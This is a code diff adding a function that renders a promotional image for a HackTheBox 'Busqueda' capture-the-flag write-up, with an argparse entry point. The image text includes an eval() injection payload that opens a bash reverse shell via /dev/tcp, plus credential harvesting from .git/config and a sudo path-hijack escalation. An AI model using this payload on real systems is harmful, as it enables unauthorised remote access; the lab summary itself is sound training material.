@@ -181,5 +181,51 @@ def generate_sau_image(out_path: str = "/tmp/sau_linkedin.png") -> str:
     )
 
 
+def generate_busqueda_image(out_path: str = "/tmp/busqueda_linkedin.png") -> str:
+    return generate_image(
+        machine    = "Busqueda",
+        difficulty = "Easy",
+        platform   = "HackTheBox",
+        tags       = ["RCE", "eval() Injection", "Privilege Escalation", "Linux", "Web"],
+        chain      = [
+            {"label": "RCE",    "sub": "eval() injection",    "color": "#e94560", "detail": "Searchor 2.4.0"},
+            {"label": "CREDS",  "sub": ".git/config leak",    "color": "#58a6ff", "detail": "Gitea + MySQL"},
+            {"label": "ROOT",   "sub": "relative path + sudo","color": "#3fb950", "detail": "full-checkup.sh"},
+        ],
+        terminal_lines = [
+            ("$ nmap -sC -sV -p-",                "#58a6ff"),
+            ("22/tcp  open  ssh",                  "#e6edf3"),
+            ("80/tcp  open  http  Apache 2.4.52",  "#e6edf3"),
+            ("",                                   ""),
+            ("# Searchor 2.4.0 — eval() payload",  "#8b949e"),
+            ("engine='+__import__('os').system(", "#58a6ff"),
+            ("  'bash -i >& /dev/tcp/... 0>&1')+","#8b949e"),
+            ("",                                   ""),
+            ("[svc@busqueda app]$ cat .git/config","#58a6ff"),
+            ("url = http://cody:***@gitea...",     "#e6edf3"),
+            ("",                                   ""),
+            ("[svc@busqueda ~]$ sudo -l",          "#58a6ff"),
+            ("NOPASSWD: python3 system-checkup.py","#e6edf3"),
+            ("",                                   ""),
+            ("$ sudo ... full-checkup  # from /tmp","#58a6ff"),
+            ("# whoami",                           "#58a6ff"),
+            ("root",                               "#3fb950"),
+            ("# cat /root/root.txt",               "#58a6ff"),
+            ("*** REDACTED ***",                   "#30363d"),
+        ],
+        out_path = out_path,
+    )
+
+
 if __name__ == "__main__":
-    generate_sau_image()
+    import argparse
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--machine", default="sau")
+    parser.add_argument("--out", default=None)
+    args = parser.parse_args()
+    if args.machine.lower() == "busqueda":
+        out = args.out or "/tmp/busqueda_linkedin.png"
+        generate_busqueda_image(out_path=out)
+    else:
+        out = args.out or "/tmp/sau_linkedin.png"
+        generate_sau_image(out_path=out)
